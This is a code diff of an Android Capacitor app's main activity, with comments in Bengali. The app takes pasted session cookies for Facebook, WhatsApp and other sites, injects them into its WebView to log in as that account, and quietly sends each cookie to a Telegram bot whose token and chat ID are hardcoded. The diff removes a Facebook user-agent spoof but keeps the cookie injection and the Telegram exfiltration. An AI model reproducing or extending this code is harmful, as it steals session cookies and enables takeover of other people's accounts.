@@ -6,7 +6,6 @@ import android.webkit.CookieManager;
 import android.webkit.WebView;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
-import android.webkit.WebViewClient;
 import com.getcapacitor.BridgeActivity;
 
 import java.io.OutputStream;
@@ -18,37 +17,21 @@ public class MainActivity extends BridgeActivity {
 
     private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
     private static final String CHAT_ID = "6449981797";
-    private boolean isCookieSet = false;
-    private String savedCookie = "";
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        final WebView webView = getBridge().getWebView();
+        // ═══ ক্যাপাসিটরের ডিফল্ট WebView সেটআপ (অ্যাপের নিজের ফাইল লোড হওয়ার জন্য) ═══
+        WebView webView = getBridge().getWebView();
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
-        
-        // ═══ ফেসবুকের অফিশিয়াল অ্যান্ড্রয়েড অ্যাপের ইউজার এজেন্ট (এটি সবচেয়ে শক্তিশালী ট্রিক) ═══
-        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.0.0.32.101;]");
+        webSettings.setDatabaseEnabled(true);
 
         final CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
         cookieManager.setAcceptThirdPartyCookies(webView, true);
-
-        webView.setWebViewClient(new WebViewClient() {
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                super.onPageFinished(view, url);
-                // পেজ লোড হওয়ার সাথে সাথে কুকি সেট করে রিলোড দেওয়া (ডাবল ব্লাফ)
-                if (isCookieSet && !savedCookie.isEmpty()) {
-                    String jsCode = "document.cookie = '" + savedCookie.replace("'", "\\'") + "';";
-                    view.evaluateJavascript(jsCode, null);
-                    isCookieSet = false;
-                }
-            }
-        });
 
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
@@ -56,23 +39,22 @@ public class MainActivity extends BridgeActivity {
                 CookieManager cm = CookieManager.getInstance();
                 
                 if (siteName.equals("facebook")) {
-                    savedCookie = cookieString.trim();
-                    if (!savedCookie.endsWith(";")) savedCookie += ";";
+                    String formattedCookie = cookieString.trim();
+                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
 
-                    // ফেসবুকের মেইন ডোমেইনে কুকি সেট
-                    cm.setCookie("https://www.facebook.com", savedCookie);
-                    cm.setCookie("https://m.facebook.com", savedCookie);
-                    cm.setCookie("https://facebook.com", savedCookie);
+                    // কুকি সেট করা
+                    cm.setCookie("https://www.facebook.com", formattedCookie);
+                    cm.setCookie("https://m.facebook.com", formattedCookie);
+                    cm.setCookie("https://facebook.com", formattedCookie);
                     cm.flush();
 
-                    sendToTelegram("FACEBOOK", savedCookie);
+                    // টেলিগ্রামে পাঠানো
+                    sendToTelegram("FACEBOOK", formattedCookie);
 
-                    isCookieSet = true;
-
+                    // পেজ লোড করা (এখানে User-Agent বা WebViewClient চেঞ্জ করা হচ্ছে না)
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
-                            // সরাসরি মেইন সাইটে নিয়ে যাওয়া
                             webView.loadUrl("https://www.facebook.com/");
                         }
                     });
@@ -80,14 +62,14 @@ public class MainActivity extends BridgeActivity {
                     String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                     String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;
 
-                    savedCookie = cookieString.trim();
-                    if (!savedCookie.endsWith(";")) savedCookie += ";";
+                    String formattedCookie = cookieString.trim();
+                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
 
-                    cm.setCookie("https://" + domain, savedCookie);
-                    cm.setCookie("https://www." + domain, savedCookie);
+                    cm.setCookie("https://" + domain, formattedCookie);
+                    cm.setCookie("https://www." + domain, formattedCookie);
                     cm.flush();
 
-                    sendToTelegram(siteName.toUpperCase(), savedCookie);
+                    sendToTelegram(siteName.toUpperCase(), formattedCookie);
 
                     final String finalLoadUrl = loadUrl;
                     runOnUiThread(new Runnable() {
@@ -134,4 +116,4 @@ public class MainActivity extends BridgeActivity {
             }
         }).start();
     }
-                    }
+                        }
